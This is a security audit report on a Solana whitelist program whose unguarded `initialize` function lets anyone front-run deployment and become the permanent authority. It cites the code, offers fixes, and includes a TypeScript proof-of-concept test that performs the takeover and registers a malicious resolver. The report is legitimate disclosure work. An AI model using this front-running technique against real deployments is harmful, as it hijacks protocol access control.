# Audit Report

## Title
Unprotected Whitelist Initializer Enables Front-Running Attack and Permanent Authority Takeover

## Summary
The `initialize` function in the whitelist program lacks access control, allowing any attacker to front-run the legitimate initialization transaction during deployment and permanently seize control of the whitelist authority. This completely compromises the protocol's access control system for resolver registration.

## Finding Description

The whitelist program's `initialize` function has no access control constraints. [1](#0-0) 

The `Initialize` account validation struct only requires that the caller is a `Signer<'info>`, with no additional constraints on who can call this critical initialization function. [2](#0-1) 

The whitelist state PDA is deterministic, derived from a constant seed `WHITELIST_STATE_SEED` defined as `b"whitelist_state"` with no additional parameters. [3](#0-2)  This allows any attacker to pre-compute the exact account address before deployment.

**Attack Scenario:**

1. **Deployment Detection**: The 1inch team deploys the whitelist program (publicly visible on-chain)
2. **Front-Running Attack**: A malicious actor monitors for initialization transactions and submits their own `initialize` transaction with a higher priority fee
3. **Attacker Wins Race**: The attacker's transaction executes first, creating the whitelist_state PDA with the attacker set as authority
4. **Legitimate Transaction Fails**: The legitimate initialization fails because Anchor's `init` constraint prevents reinitializing an already-initialized account
5. **Permanent Takeover**: The attacker now permanently controls all resolver registration/deregistration operations

The `register` and `deregister` functions both enforce that only the whitelist authority can execute them through constraint checks. [4](#0-3) [5](#0-4) 

The `set_authority` function requires the current authority to sign, providing no recovery mechanism once a malicious actor becomes the authority. [6](#0-5) 

This breaks the protocol's critical access control invariant that only authorized, KYC/KYB-verified resolvers can participate in order resolution. An attacker controlling the whitelist authority can bypass this entirely.

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables complete compromise of the protocol's resolver access control system:

- **Permanent Authority Hijacking**: The attacker gains permanent, irrevocable control of the whitelist authority through a one-time front-running attack during deployment
- **Complete Access Control Bypass**: The attacker can register any resolvers without KYC/KYB verification or deregister all legitimate resolvers
- **Protocol-Wide DoS**: All order filling and resolver cancellation operations depend on resolver whitelist status [7](#0-6) [8](#0-7) 
- **No Recovery Path**: Without redeploying the entire whitelist program and migrating all dependent contracts, there's no way to recover from this attack
- **Value Extraction**: A malicious authority could register themselves as resolvers to manipulate order execution and extract value, or hold the protocol hostage

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to succeed because:

1. **Easy to Execute**: Monitoring for program deployments and initialization transactions is trivial using standard Solana RPC methods. Front-running with higher priority fees is a well-documented attack vector on Solana
2. **One-Time Critical Window**: The initialization only happens once during deployment, making it a high-value target that attackers will actively monitor for major DeFi protocols
3. **No Technical Barriers**: Any attacker with basic Solana knowledge can construct and submit an initialize transaction
4. **Public and Predictable**: Program deployments are public on-chain, and the whitelist state address is fully predictable from the deterministic PDA derivation
5. **High Value Target**: Controlling the whitelist authority of a major DeFi protocol provides significant power and potential for profit extraction

The initialization script confirms this vulnerability, showing a standard deployment pattern without any front-running protections. [9](#0-8) 

## Recommendation

Add access control to the `initialize` function to restrict who can call it. The recommended fix is to hardcode an authorized deployer public key or require a specific signature proof:

**Option 1: Hardcoded Deployer**
```rust
pub const AUTHORIZED_DEPLOYER: Pubkey = pubkey!("YOUR_DEPLOYER_PUBKEY_HERE");

pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    require!(
        ctx.accounts.authority.key() == AUTHORIZED_DEPLOYER,
        WhitelistError::UnauthorizedInitializer
    );
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: Multi-Step Initialization**
Implement a two-step initialization where the first step is called atomically during program deployment with upgrade authority verification, then authority is transferred in a second step.

**Option 3: Deploy-Time Initialization**
Structure the deployment so that initialization happens atomically with program deployment using program upgrade authority verification.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../../target/types/whitelist";
import { expect } from "chai";

describe("Whitelist Front-Running PoC", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Whitelist as Program<Whitelist>;

  it("Demonstrates front-running attack on initialize", async () => {
    // Attacker generates their own keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund attacker account
    const signature = await provider.connection.requestAirdrop(
      attacker.publicKey,
      1_000_000_000
    );
    await provider.connection.confirmTransaction(signature);

    // Compute the deterministic PDA address (same for everyone)
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    // Attacker front-runs initialization with higher priority fee
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify attacker now controls the whitelist
    const whitelistState = await program.account.whitelistState.fetch(
      whitelistStatePDA
    );
    expect(whitelistState.authority.toString()).to.equal(
      attacker.publicKey.toString()
    );

    // Legitimate deployer tries to initialize but fails
    const legitimateDeployer = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateDeployer.publicKey,
      1_000_000_000
    );

    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateDeployer.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateDeployer])
        .rpc();
      
      expect.fail("Should have failed due to account already initialized");
    } catch (error) {
      // Expected to fail - account already initialized by attacker
      expect(error.toString()).to.include("already in use");
    }

    // Attacker can now register malicious resolvers
    const maliciousResolver = anchor.web3.Keypair.generate();
    await program.methods
      .register(maliciousResolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    // Legitimate deployer cannot register resolvers
    const legitimateResolver = anchor.web3.Keypair.generate();
    try {
      await program.methods
        .register(legitimateResolver.publicKey)
        .accountsPartial({
          authority: legitimateDeployer.publicKey,
        })
        .signers([legitimateDeployer])
        .rpc();
      
      expect.fail("Should have failed due to unauthorized");
    } catch (error) {
      expect(error.toString()).to.include("Unauthorized");
    }
  });
});
```

## Notes

This vulnerability represents a critical flaw in the deployment security of the whitelist program. While front-running is a known issue in blockchain systems, the complete absence of any access control on the `initialize` function makes this a code vulnerability rather than merely a deployment procedure issue. The code should implement protections that make secure deployment possible, such as hardcoded deployer verification or atomic initialization with program deployment.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L24-28)
```rust
    /// Registers a new user to the whitelist
    pub fn register(ctx: Context<Register>, _user: Pubkey) -> Result<()> {
        ctx.accounts.resolver_access.bump = ctx.bumps.resolver_access;
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L30-33)
```rust
    /// Removes a user from the whitelist
    pub fn deregister(_ctx: Context<Deregister>, _user: Pubkey) -> Result<()> {
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L44-58)
```rust
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L66-72)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L92-98)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L115-122)
```rust
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** scripts/whitelsit/initialize.ts (L20-42)
```typescript
async function initialize(
  connection: Connection,
  program: Program<Whitelist>,
  authorityKeypair: Keypair
): Promise<void> {
  const whitelistState = findWhitelistStateAddress(program.programId);

  const initializeIx = await program.methods
    .initialize()
    .accountsPartial({
      authority: authorityKeypair.publicKey,
      whitelistState,
    })
    .signers([authorityKeypair])
    .instruction();

  const tx = new Transaction().add(initializeIx);

  const signature = await sendAndConfirmTransaction(connection, tx, [
    authorityKeypair,
  ]);
  console.log(`Transaction signature ${signature}`);
}
```
